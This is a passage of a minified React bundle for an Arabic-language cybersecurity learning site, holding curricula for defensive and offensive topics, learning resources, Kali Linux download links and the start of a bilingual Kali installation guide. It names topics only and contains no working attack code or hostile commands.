                        "تعريف: الدفاع عن المؤسسة واكتشاف والاستجابة للتهديدات",
                        "SOC (Security Operations Center): مركز عمليات الأمن",
                        "SIEM: جمع وتحليل السجلات (Splunk، ELK، QRadar)",
                        "EDR (Endpoint Detection and Response): حماية النقاط النهائية",
                        "Threat Hunting: البحث الاستباقي عن التهديدات",
                        "Incident Response: الاستجابة للحوادث الأمنية",
                        "Threat Intelligence: استخبارات التهديدات",
                        "Vulnerability Management: إدارة الثغرات",
                        "Security Awareness: توعية الموظفين",
                        "Tabletop Exercises: تمارين محاكاة للحوادث",
                    ],
                },
                {
                    title: "الفريق البنفسجي (Purple Team)",
                    content: [
                        "تعريف: دمج الأحمر والأزرق للتحسين المستمر",
                        "Collaboration: تعاون بين الفريقين بدلاً من المنافسة",
                        "Attack Simulation: محاكاة هجمات وقياس الاستجابة",
                        "Detection Engineering: تطوير قواعد الكشف معاً",
                        "Gap Analysis: تحديد الفجوات في الدفاعات",
                        "Continuous Improvement: تحسين مستمر للدفاعات",
                        "Metrics: قياس الأداء (MTTD، MTTR)",
                        "Atomic Red Team: اختبارات صغيرة للتكتيكات",
                        "MITRE ATT&CK Mapping: ربط الاختبارات بالإطار",
                        "Lessons Learned: توثيق الدروس المستفادة",
                    ],
                },
                {
                    title: "الاستجابة للحوادث (Incident Response)",
                    content: [
                        "Preparation: التحضير والتخطيط المسبق",
                        "Identification: اكتشاف وتحديد الحادثة",
                        "Containment: احتواء الحادثة ومنع انتشارها",
                        "Eradication: إزالة التهديد من الأنظمة",
                        "Recovery: استعادة الأنظمة للعمل الطبيعي",
                        "Lessons Learned: توثيق الدروس المستفادة",
                        "Playbooks: إجراءات موثقة لأنواع الحوادث المختلفة",
                        "Communication: التواصل مع الأطراف المعنية",
                        "Legal/Compliance: الامتثال للمتطلبات القانونية",
                        "Post-Incident Review: مراجعة ما بعد الحادثة",
                    ],
                },
            ],
        },
        {
            icon: lx,
            title: "البرمجة للأمن السيبراني",
            description: "لغات البرمجة والأتمتة في مجال الأمن",
            subTopics: [
                {
                    title: "Python للأمن السيبراني",
                    content: [
                        "لماذا Python: سهولة التعلم، مكتبات ضخمة، مجتمع نشط",
                        "Scapy: إنشاء وتحليل حزم الشبكة",
                        "Requests: التعامل مع HTTP/HTTPS",
                        "BeautifulSoup/Scrapy: استخراج البيانات من الويب",
                        "Paramiko: التعامل مع SSH",
                        "Cryptography: تشفير وفك تشفير",
                        "Pwntools: أداة للـ CTF والـ Binary Exploitation",
                        "Impacket: بروتوكولات Windows (SMB، MSRPC)",
                        "Socket Programming: برمجة الشبكات منخفضة المستوى",
                        "Malware Development: كتابة أدوات للاختبار (للتعليم فقط)",
                    ],
                },
                {
                    title: "Bash Scripting",
                    content: [
                        "أتمتة المهام: أتمتة فحوصات الأمان المتكررة",
                        "Log Analysis: تحليل السجلات والبحث فيها",
                        "System Administration: إدارة أنظمة Linux",
                        "Reconnaissance Scripts: سكربتات جمع المعلومات",
                        "Backup Automation: أتمتة النسخ الاحتياطي",
                        "Monitoring Scripts: سكربتات المراقبة",
                        "File Processing: معالجة الملفات والنصوص",
                        "Network Tools: أدوات شبكية بسيطة",
                        "Cron Jobs: جدولة المهام",
                        "One-liners: أوامر قوية من سطر واحد",
                    ],
                },
                {
                    title: "PowerShell للأمن",
                    content: [
                        "Active Directory: استعلام وإدارة AD",
                        "Event Log Analysis: تحليل سجلات Windows",
                        "Incident Response: أتمتة الاستجابة للحوادث",
                        "Forensics: جمع الأدلة الرقمية",
                        "Remote Administration: إدارة الأجهزة عن بعد",
                        "Security Baselines: تطبيق والتحقق من معايير الأمان",
                        "Offensive PowerShell: PowerShell Empire، Nishang",
                        "AMSI Bypass: تجاوز Anti-Malware Scan Interface",
                        "Constrained Language Mode: وضع اللغة المقيدة",
                        "PowerShell Logging: تفعيل وتحليل السجلات",
                    ],
                },
                {
                    title: "لغات أخرى مهمة",
                    content: [
                        "C/C++: فهم Buffer Overflow، كتابة Exploits، تطوير أدوات منخفضة المستوى",
                        "Assembly: فهم الهندسة العكسية وكتابة Shellcode",
                        "JavaScript: اختبار أمان الويب، كتابة XSS payloads",
                        "Go (Golang): أدوات سريعة ومستقلة (Cobalt Strike alternatives)",
                        "Rust: أدوات أمنية آمنة الذاكرة",
                        "SQL: فهم واستغلال SQL Injection",
                        "Ruby: Metasploit مكتوب بـ Ruby",
                        "Lua: Nmap scripts (NSE)",
                        "PHP: فهم ثغرات تطبيقات PHP الشائعة",
                        "Regex: التعبيرات النمطية للبحث والتحليل",
                    ],
                },
            ],
        },
        {
            icon: Cg,
            title: "مصادر التعلم والتطبيق",
            description: "منصات التدريب والموارد لتطوير مهاراتك",
            subTopics: [
                {
                    title: "منصات التدريب العملي",
                    content: [
                        "HackTheBox: منصة CTF وLabs متقدمة (Machines، Challenges، Pro Labs)",
                        "TryHackMe: ممتازة للمبتدئين مع مسارات تعليمية (Learning Paths)",
                        "PentesterLab: تركيز على اختبار تطبيقات الويب",
                        "VulnHub: أجهزة افتراضية مجانية للتنزيل والتدريب",
                        "Offensive Security Proving Grounds: من صناع OSCP",
                        "PortSwigger Web Security Academy: دورة مجانية ممتازة للويب",
                        "PicoCTF: CTF للمبتدئين من CMU",
                        "OverTheWire: Wargames للمبتدئين (Bandit، Natas)",
                        "Root-Me: تحديات متنوعة بالفرنسية والإنجليزية",
                        "CyberDefenders: تركيز على Blue Team والـ DFIR",
                    ],
                },
                {
                    title: "دورات وكورسات",
                    content: [
                        "Offensive Security (OSCP/OSWE/OSEP): الأفضل للعمل العملي",
                        "SANS Institute: دورات عالية الجودة (مكلفة جداً)",
                        "EC-Council (CEH، CPENT): شهادات معروفة",
                        "eLearnSecurity/INE: EJPT، eCPPT، eWPT",
                        "Coursera/edX: دورات جامعية مجانية",
                        "Udemy: دورات متنوعة بأسعار رخيصة",
                        "Cybrary: دورات مجانية ومدفوعة",
                        "YouTube: مصادر مجانية ممتازة (IppSec، John Hammond، LiveOverflow)",
                        "TCM Security: دورات عملية بأسعار معقولة",
                        "Zero Point Security (RTO): تدريب Red Team متقدم",
                    ],
                },
                {
                    title: "كتب ومراجع",
                    content: [
                        "The Web Application Hacker's Handbook: الكتاب الأساسي لأمن الويب",
                        "Hacking: The Art of Exploitation: أساسيات الاستغلال",
                        "Penetration Testing (Georgia Weidman): دليل شامل للمبتدئين",
                        "The Hacker Playbook 3: تكتيكات Red Team",
                        "Black Hat Python/Go: برمجة أدوات الأمان",
                        "Practical Malware Analysis: تحليل البرمجيات الخبيثة",
                        "Blue Team Handbook: دليل الفريق الأزرق",
                        "RTFM/BTFM: مراجع سريعة للـ Red/Blue Team",
                        "OWASP Testing Guide: دليل اختبار الويب المجاني",
                        "NIST Cybersecurity Framework: إطار العمل الأساسي",
                    ],
                },
                {
                    title: "مجتمعات ومصادر",
                    content: [
                        "Reddit: r/netsec، r/hacking، r/AskNetsec",
                        "Twitter/X: متابعة الباحثين الأمنيين",
                        "Discord: HackTheBox، TryHackMe، InfoSec Prep",
                        "GitHub: أدوات مفتوحة المصدر وأبحاث",
                        "Awesome Security: قوائم منسقة للموارد",
                        "Security Newsletters: tl;dr sec، This Week in Security",
                        "Podcasts: Darknet Diaries، Security Now، Risky Business",
                        "Conferences: DEF CON، Black Hat، BSides (فيديوهات مجانية)",
                        "Bug Bounty Write-ups: تعلم من تقارير الآخرين",
                        "CTF Write-ups: حلول التحديات السابقة",
                    ],
                },
                {
                    title: "نصائح للمسار المهني",
                    content: [
                        "ابدأ بالأساسيات: الشبكات، Linux، البرمجة قبل الأمن",
                        "تعلم بالممارسة: النظرية وحدها لا تكفي",
                        "شارك في CTFs: تطوير مهارات حل المشكلات",
                        "ابني Portfolio: مشاريع، Write-ups، مساهمات",
                        "احصل على شهادات: تفتح أبواب التوظيف",
                        "شارك في Bug Bounty: دخل إضافي وخبرة حقيقية",
                        "انضم للمجتمعات: التواصل مع المحترفين",
                        "تابع الأخبار: التهديدات والأدوات الجديدة",
                        "تخصص: اختر مجالاً وتعمق فيه",
                        "لا تتوقف: هذا المجال يتطور باستمرار",
                    ],
                },
            ],
        },
    ],
    wk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState(null),
            o = (c) => {
                t(e === c ? null : c), r(null);
            },
            i = (c) => {
                r(n === c ? null : c);
            },
            s = ys.reduce((c, u) => c + u.subTopics.length, 0),
            a = ys.reduce((c, u) => c + u.subTopics.reduce((d, p) => d + p.content.length, 0), 0);
        return l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "pt-24 pb-16",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-16",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: l.jsx(Tc, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    l.jsx("h1", {
                                        className: "text-4xl md:text-5xl font-bold text-primary text-glow mb-4",
                                        children: "الدليل الكامل للأمن السيبراني",
                                    }),
                                    l.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-3xl mx-auto mb-6",
                                        children: "دليلك الشامل لتعلم الأمن السيبراني من الصفر إلى الاحتراف",
                                    }),
                                    l.jsxs("div", {
                                        className: "flex flex-wrap justify-center gap-4",
                                        children: [
                                            l.jsxs("span", {
                                                className:
                                                    "px-4 py-2 rounded-full bg-primary/10 border border-primary/30 text-primary text-sm font-medium",
                                                children: [ys.length, " قسم رئيسي"],
                                            }),
                                            l.jsxs("span", {
                                                className:
                                                    "px-4 py-2 rounded-full bg-primary/10 border border-primary/30 text-primary text-sm font-medium",
                                                children: [s, " موضوع فرعي"],
                                            }),
                                            l.jsxs("span", {
                                                className:
                                                    "px-4 py-2 rounded-full bg-primary/10 border border-primary/30 text-primary text-sm font-medium",
                                                children: ["+", a, " نقطة تعليمية"],
                                            }),
                                        ],
                                    }),
                                ],
                            }),
                            l.jsx("div", {
                                className: "max-w-5xl mx-auto space-y-4",
                                children: ys.map((c, u) =>
                                    l.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                l.jsxs("button", {
                                                    onClick: () => o(u),
                                                    className:
                                                        "w-full p-6 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                    children: [
                                                        l.jsxs("div", {
                                                            className: "flex items-center gap-4",
                                                            children: [
                                                                l.jsx("div", {
                                                                    className:
                                                                        "w-14 h-14 rounded-2xl bg-gradient-to-br from-primary/20 to-primary/5 border border-primary/30 flex items-center justify-center",
                                                                    children: l.jsx(c.icon, {
                                                                        className: "w-7 h-7 text-primary",
                                                                    }),
                                                                }),
                                                                l.jsxs("div", {
                                                                    className: "text-right",
                                                                    children: [
                                                                        l.jsx("h2", {
                                                                            className:
                                                                                "text-xl md:text-2xl font-bold text-primary",
                                                                            children: c.title,
                                                                        }),
                                                                        l.jsx("p", {
                                                                            className:
                                                                                "text-muted-foreground text-sm mt-1",
                                                                            children: c.description,
                                                                        }),
                                                                    ],
                                                                }),
                                                            ],
                                                        }),
                                                        l.jsxs("div", {
                                                            className: "flex items-center gap-3",
                                                            children: [
                                                                l.jsxs("span", {
                                                                    className:
                                                                        "hidden md:block px-3 py-1 rounded-full bg-primary/10 text-primary text-sm",
                                                                    children: [c.subTopics.length, " موضوع"],
                                                                }),
                                                                e === u
                                                                    ? l.jsx(oa, { className: "w-6 h-6 text-primary" })
                                                                    : l.jsx(ra, {
                                                                          className: "w-6 h-6 text-muted-foreground",
                                                                      }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                                e === u &&
                                                    l.jsx("div", {
                                                        className:
                                                            "border-t border-border/30 p-4 space-y-3 animate-fade-in",
                                                        children: c.subTopics.map((d, p) => {
                                                            const m = `${u}-${p}`;
                                                            return l.jsxs(
                                                                "div",
                                                                {
                                                                    className:
                                                                        "rounded-xl bg-secondary/30 overflow-hidden",
                                                                    children: [
                                                                        l.jsxs("button", {
                                                                            onClick: () => i(m),
                                                                            className:
                                                                                "w-full p-4 flex items-center justify-between hover:bg-secondary/50 transition-colors",
                                                                            children: [
                                                                                l.jsxs("div", {
                                                                                    className:
                                                                                        "flex items-center gap-3",
                                                                                    children: [
                                                                                        l.jsx("span", {
                                                                                            className:
                                                                                                "w-8 h-8 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-sm",
                                                                                            children: p + 1,
                                                                                        }),
                                                                                        l.jsx("h3", {
                                                                                            className:
                                                                                                "text-lg font-semibold text-foreground",
                                                                                            children: d.title,
                                                                                        }),
                                                                                    ],
                                                                                }),
                                                                                l.jsxs("div", {
                                                                                    className:
                                                                                        "flex items-center gap-2",
                                                                                    children: [
                                                                                        l.jsxs("span", {
                                                                                            className:
                                                                                                "hidden sm:block text-xs text-muted-foreground",
                                                                                            children: [
                                                                                                d.content.length,
                                                                                                " نقطة",
                                                                                            ],
                                                                                        }),
                                                                                        n === m
                                                                                            ? l.jsx(oa, {
                                                                                                  className:
                                                                                                      "w-5 h-5 text-primary",
                                                                                              })
                                                                                            : l.jsx(ra, {
                                                                                                  className:
                                                                                                      "w-5 h-5 text-muted-foreground",
                                                                                              }),
                                                                                    ],
                                                                                }),
                                                                            ],
                                                                        }),
                                                                        n === m &&
                                                                            l.jsx("div", {
                                                                                className:
                                                                                    "px-4 pb-4 space-y-2 animate-fade-in",
                                                                                children: d.content.map((f, S) =>
                                                                                    l.jsxs(
                                                                                        "div",
                                                                                        {
                                                                                            className:
                                                                                                "flex items-start gap-3 p-3 rounded-lg bg-background/50",
                                                                                            children: [
                                                                                                l.jsx(Ac, {
                                                                                                    className:
                                                                                                        "w-5 h-5 text-primary flex-shrink-0 mt-0.5",
                                                                                                }),
                                                                                                l.jsx("p", {
                                                                                                    className:
                                                                                                        "text-muted-foreground leading-relaxed",
                                                                                                    children: f,
                                                                                                }),
                                                                                            ],
                                                                                        },
                                                                                        S
                                                                                    )
                                                                                ),
                                                                            }),
                                                                    ],
                                                                },
                                                                p
                                                            );
                                                        }),
                                                    }),
                                            ],
                                        },
                                        u
                                    )
                                ),
                            }),
                            l.jsx("div", {
                                className: "max-w-5xl mx-auto mt-12",
                                children: l.jsxs("div", {
                                    className: "cyber-card p-8",
                                    children: [
                                        l.jsx("h3", {
                                            className: "text-2xl font-bold text-primary mb-6 text-center",
                                            children: "نصائح ذهبية للمبتدئين",
                                        }),
                                        l.jsxs("div", {
                                            className: "grid grid-cols-1 md:grid-cols-3 gap-6",
                                            children: [
                                                l.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: l.jsx(Tc, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        l.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "تعلم الأساسيات",
                                                        }),
                                                        l.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "ابدأ بتعلم الشبكات، لينكس، والبرمجة قبل التعمق في الأمن السيبراني",
                                                        }),
                                                    ],
                                                }),
                                                l.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: l.jsx(wg, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        l.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "تدرب باستمرار",
                                                        }),
                                                        l.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "استخدم منصات مثل HackTheBox و TryHackMe للتدريب العملي يومياً",
                                                        }),
                                                    ],
                                                }),
                                                l.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: l.jsx(Tr, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        l.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "كن أخلاقياً",
                                                        }),
                                                        l.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "استخدم معرفتك لحماية الأنظمة واحترم القوانين دائماً",
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                        l.jsxs("div", {
                                            className: "grid grid-cols-1 md:grid-cols-2 gap-6 mt-6",
                                            children: [
                                                l.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: l.jsx(kg, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        l.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "انضم للمجتمعات",
                                                        }),
                                                        l.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "شارك في المجتمعات وتواصل مع المحترفين لتسريع تعلمك",
                                                        }),
                                                    ],
                                                }),
                                                l.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        l.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: l.jsx(Gu, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        l.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "لا تتوقف",
                                                        }),
                                                        l.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "هذا المجال يتطور باستمرار - التعلم المستمر هو مفتاح النجاح",
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
            ],
        });
    },
    Br = [
        {
            name: { ar: "Kali Linux Installer", en: "Kali Linux Installer" },
            description: {
                ar: "النسخة الكاملة للتثبيت على الجهاز مع واجهة رسومية",
                en: "Full version for PC installation with GUI",
            },
            icon: si,
            size: "3.5 GB",
            link: "https://www.kali.org/get-kali/#kali-installer-images",
            category: "desktop",
        },
        {
            name: { ar: "Kali Everything ISO", en: "Kali Everything ISO" },
            description: {
                ar: "نسخة كاملة مع جميع الأدوات مسبقاً",
                en: "Complete version with all tools pre-installed",
            },
            icon: bx,
            size: "9.5 GB",
            link: "https://www.kali.org/get-kali/#kali-installer-images",
            category: "desktop",
        },
        {
            name: { ar: "Kali NetInstaller", en: "Kali NetInstaller" },
            description: {
                ar: "نسخة خفيفة للتحميل من الإنترنت أثناء التثبيت",
                en: "Minimal version that downloads during install",
            },
            icon: mg,
            size: "500 MB",
            link: "https://www.kali.org/get-kali/#kali-installer-images",
            category: "desktop",
        },
        {
            name: { ar: "Kali Live Boot", en: "Kali Live Boot" },
            description: { ar: "التشغيل مباشرة من USB بدون تثبيت", en: "Boot directly from USB without installation" },
            icon: bg,
            size: "3.5 GB",
            link: "https://www.kali.org/get-kali/#kali-live",
            category: "live",
        },
        {
            name: { ar: "Kali with Persistence", en: "Kali with Persistence" },
            description: { ar: "Live مع حفظ البيانات على USB", en: "Live boot with data persistence on USB" },
            icon: mx,
            size: "3.5 GB",
            link: "https://www.kali.org/docs/usb/usb-persistence-encryption/",
            category: "live",
        },
        {
            name: { ar: "Kali VMware", en: "Kali VMware" },
            description: { ar: "صورة جاهزة لبرنامج VMware", en: "Pre-built image for VMware" },
            icon: Wu,
            size: "3.2 GB",
            link: "https://www.kali.org/get-kali/#kali-virtual-machines",
            category: "vm",
        },
        {
            name: { ar: "Kali VirtualBox", en: "Kali VirtualBox" },
            description: { ar: "صورة جاهزة لبرنامج VirtualBox", en: "Pre-built image for VirtualBox" },
            icon: dg,
            size: "3.2 GB",
            link: "https://www.kali.org/get-kali/#kali-virtual-machines",
            category: "vm",
        },
        {
            name: { ar: "Kali Hyper-V", en: "Kali Hyper-V" },
            description: { ar: "صورة جاهزة لـ Windows Hyper-V", en: "Pre-built image for Windows Hyper-V" },
            icon: yg,
            size: "3.2 GB",
            link: "https://www.kali.org/get-kali/#kali-virtual-machines",
            category: "vm",
        },
        {
            name: { ar: "Kali QEMU", en: "Kali QEMU" },
            description: { ar: "صورة جاهزة لـ QEMU/KVM", en: "Pre-built image for QEMU/KVM" },
            icon: xg,
            size: "3.2 GB",
            link: "https://www.kali.org/get-kali/#kali-virtual-machines",
            category: "vm",
        },
        {
            name: { ar: "Kali Raspberry Pi", en: "Kali Raspberry Pi" },
            description: { ar: "نسخة لأجهزة Raspberry Pi", en: "Version for Raspberry Pi devices" },
            icon: ia,
            size: "2.5 GB",
            link: "https://www.kali.org/get-kali/#kali-arm",
            category: "arm",
        },
        {
            name: { ar: "Kali PineBook", en: "Kali PineBook" },
            description: { ar: "نسخة لأجهزة PineBook", en: "Version for PineBook devices" },
            icon: gg,
            size: "2.5 GB",
            link: "https://www.kali.org/get-kali/#kali-arm",
            category: "arm",
        },
        {
            name: { ar: "Kali NetHunter (Rootless)", en: "Kali NetHunter (Rootless)" },
            description: { ar: "نسخة للأندرويد بدون روت", en: "Android version without root" },
            icon: Ku,
            size: "1.2 GB",
            link: "https://www.kali.org/get-kali/#kali-mobile",
            category: "mobile",
        },
        {
            name: { ar: "Kali NetHunter (Root)", en: "Kali NetHunter (Root)" },
            description: { ar: "النسخة الكاملة للأجهزة المروتة", en: "Full version for rooted devices" },
            icon: Tr,
            size: "1.8 GB",
            link: "https://www.kali.org/get-kali/#kali-mobile",
            category: "mobile",
        },
        {
            name: { ar: "iSH Shell (iOS)", en: "iSH Shell (iOS)" },
            description: { ar: "محاكي لينكس للآيفون والآيباد", en: "Linux emulator for iPhone/iPad" },
            icon: jx,
            size: "50 MB",
            link: "https://apps.apple.com/app/ish-shell/id1436902243",
            category: "mobile",
        },
        {
            name: { ar: "Termux (F-Droid)", en: "Termux (F-Droid)" },
            description: {
                ar: "محاكي لينكس للأندرويد - النسخة الرسمية",
                en: "Linux emulator for Android - Official version",
            },
            icon: Ar,
            size: "100 MB",
            link: "https://f-droid.org/packages/com.termux/",
            category: "termux",
        },
        {
            name: { ar: "Termux:API", en: "Termux:API" },
            description: { ar: "إضافة للوصول لميزات الهاتف", en: "Add-on for phone features access" },
            icon: wx,
            size: "5 MB",
            link: "https://f-droid.org/packages/com.termux.api/",
            category: "termux",
        },
    ],
    Sk = {
        desktop: {
            title: {
                ar: "تثبيت كالي لينكس على الكمبيوتر (دليل شامل)",
                en: "Install Kali Linux on PC (Complete Guide)",
            },
            description: {
                ar: "دليل مفصل خطوة بخطوة لتثبيت كالي لينكس على جهاز الكمبيوتر كنظام أساسي أو بجانب Windows",
                en: "Detailed step-by-step guide to install Kali Linux as primary OS or dual boot with Windows",
            },
            requirements: {
                ar: [
                    "معالج 64-bit (AMD64/x86-64)",
                    "ذاكرة RAM: 2GB كحد أدنى (4GB مستحسن، 8GB للأداء الأفضل)",
                    "مساحة القرص: 20GB كحد أدنى (50GB مستحسن)",
                    "فلاشة USB سعة 8GB أو أكثر",
                    "اتصال إنترنت (مستحسن)",
                    "برنامج Rufus أو Etcher لحرق الـ ISO",
                ],
                en: [
                    "64-bit processor (AMD64/x86-64)",
                    "RAM: 2GB minimum (4GB recommended, 8GB for best performance)",
                    "Disk space: 20GB minimum (50GB recommended)",
                    "USB drive 8GB or larger",
                    "Internet connection (recommended)",
                    "Rufus or Etcher for burning ISO",
                ],
            },
            steps: [
                {
                    title: { ar: "تحميل ملف ISO", en: "Download ISO File" },
                    description: {
                        ar: "توجه للموقع الرسمي وحمّل النسخة المناسبة",
                        en: "Go to official website and download appropriate version",
                    },
                    tips: [
                        {
                            ar: "اختر Installer للتثبيت الكامل أو Live للتجربة أولاً",
                            en: "Choose Installer for full install or Live to try first",
                        },
                        { ar: "تحقق من الـ Hash للتأكد من سلامة الملف", en: "Verify hash to ensure file integrity" },
                    ],
                },
                {
                    title: { ar: "إنشاء USB قابل للإقلاع باستخدام Rufus", en: "Create Bootable USB with Rufus" },
                    description: { ar: "حرق ملف ISO على الفلاشة", en: "Burn ISO file to USB drive" },
                    tips: [
                        { ar: "اختر GPT إذا كان جهازك يدعم UEFI", en: "Select GPT if your system supports UEFI" },
                        { ar: "اختر MBR للأجهزة القديمة مع BIOS", en: "Select MBR for older systems with BIOS" },
                        { ar: "اختر DD mode إذا لم يعمل ISO mode", en: "Choose DD mode if ISO mode doesn't work" },
                    ],
                    warnings: [{ ar: "سيتم مسح جميع البيانات على الفلاشة!", en: "All data on USB will be erased!" }],
                },
                {
                    title: { ar: "الدخول لإعدادات BIOS/UEFI", en: "Enter BIOS/UEFI Settings" },
                    description: { ar: "تغيير ترتيب الإقلاع للإقلاع من USB", en: "Change boot order to boot from USB" },
                    tips: [
                        {
                            ar: "اضغط F2, F12, Del, أو Esc عند بدء التشغيل (يختلف حسب الشركة المصنعة)",
                            en: "Press F2, F12, Del, or Esc at startup (varies by manufacturer)",
                        },
                        { ar: "عطّل Secure Boot إذا لم يظهر USB", en: "Disable Secure Boot if USB doesn't appear" },
                        { ar: "فعّل Legacy Boot للأجهزة القديمة", en: "Enable Legacy Boot for older systems" },
                    ],
                },
                {
                    title: { ar: "بدء التثبيت", en: "Start Installation" },
                    description: {
                        ar: "اختر Graphical Install للتثبيت السهل",
                        en: "Select Graphical Install for easy installation",
                    },
                    tips: [
                        { ar: "اختر اللغة والموقع الجغرافي", en: "Select language and location" },
                        { ar: "اختر لوحة المفاتيح المناسبة", en: "Choose appropriate keyboard layout" },
                    ],
                },
                {
                    title: { ar: "إعداد الشبكة", en: "Network Setup" },
                    description: {
                        ar: "اتصل بالإنترنت للحصول على آخر التحديثات",
                        en: "Connect to internet for latest updates",
                    },
                    tips: [
                        { ar: "يمكنك تخطي هذه الخطوة والاتصال لاحقاً", en: "You can skip this step and connect later" },
                    ],
                },
                {
                    title: { ar: "إنشاء المستخدم", en: "Create User" },
                    description: { ar: "أنشئ اسم المستخدم وكلمة المرور", en: "Create username and password" },
                    warnings: [
                        {
                            ar: "لا تستخدم root كاسم مستخدم (محظور في الإصدارات الحديثة)",
                            en: "Don't use root as username (blocked in recent versions)",
                        },
                        { ar: "اختر كلمة مرور قوية!", en: "Choose a strong password!" },
                    ],
                },
                {
                    title: { ar: "تقسيم القرص", en: "Partition Disk" },
                    description: { ar: "اختر طريقة تقسيم القرص", en: "Choose disk partitioning method" },
                    tips: [
                        {
                            ar: "Guided - use entire disk: للمبتدئين (يمسح كل شيء)",
                            en: "Guided - use entire disk: for beginners (erases everything)",
                        },
                        {
                            ar: "Manual: للمستخدمين المتقدمين أو Dual Boot",
                            en: "Manual: for advanced users or Dual Boot",
                        },
                        {
                            ar: "للـ Dual Boot: أنشئ partition جديد من المساحة الفارغة",
                            en: "For Dual Boot: create new partition from free space",
                        },
                    ],
                    warnings: [
                        { ar: "احتفظ بنسخة احتياطية قبل التقسيم!", en: "Backup your data before partitioning!" },
                    ],
                },
                {
                    title: { ar: "تثبيت النظام", en: "System Installation" },
                    description: { ar: "انتظر اكتمال نسخ الملفات", en: "Wait for file copying to complete" },
                    tips: [
                        {
                            ar: "قد يستغرق 20-45 دقيقة حسب سرعة الجهاز",
                            en: "May take 20-45 minutes depending on system speed",
                        },
                    ],
                },
                {
                    title: { ar: "تثبيت GRUB", en: "Install GRUB" },
                    description: { ar: "تثبيت محمل الإقلاع", en: "Install boot loader" },
                    tips: [
                        { ar: "اختر القرص الرئيسي (عادة /dev/sda)", en: "Select primary disk (usually /dev/sda)" },
                        {
                            ar: "للـ Dual Boot: سيكتشف Windows تلقائياً",
                            en: "For Dual Boot: it will detect Windows automatically",
                        },
                    ],
                },
                {
                    title: { ar: "إعادة التشغيل والتحديث", en: "Reboot and Update" },
                    description: { ar: "أعد التشغيل وحدّث النظام", en: "Reboot and update the system" },
                    commands: ["sudo apt update", "sudo apt full-upgrade -y", "sudo apt autoremove -y"],
                },
            ],
            troubleshooting: [
                {
                    problem: { ar: "لا يظهر USB في قائمة الإقلاع", en: "USB doesn't appear in boot menu" },
                    solution: {
                        ar: "عطّل Secure Boot وفعّل Legacy Boot في BIOS",
                        en: "Disable Secure Boot and enable Legacy Boot in BIOS",
                    },
                },
                {
                    problem: { ar: "شاشة سوداء بعد التثبيت", en: "Black screen after installation" },
                    solution: {
                        ar: "أضف nomodeset لخيارات GRUB أو حدّث تعريف كرت الشاشة",
                        en: "Add nomodeset to GRUB options or update graphics driver",
                    },
                },
                {
                    problem: { ar: "WiFi لا يعمل", en: "WiFi not working" },
                    solution: {
                        ar: "شغّل: sudo apt install firmware-iwlwifi ثم أعد التشغيل",
                        en: "Run: sudo apt install firmware-iwlwifi then reboot",
                    },
                },
                {
                    problem: { ar: "الصوت لا يعمل", en: "Sound not working" },
                    solution: {
                        ar: "شغّل: sudo apt install pulseaudio pavucontrol",
                        en: "Run: sudo apt install pulseaudio pavucontrol",
                    },
                },
            ],
        },
        vm: {
            title: { ar: "تثبيت كالي على Virtual Machine", en: "Install Kali on Virtual Machine" },
            description: {
                ar: "الطريقة الأسهل والأكثر أماناً لتشغيل كالي لينكس بجانب نظامك الحالي",
                en: "The easiest and safest way to run Kali Linux alongside your current OS",
            },
            requirements: {
                ar: [
                    "VirtualBox أو VMware (مجاني)",
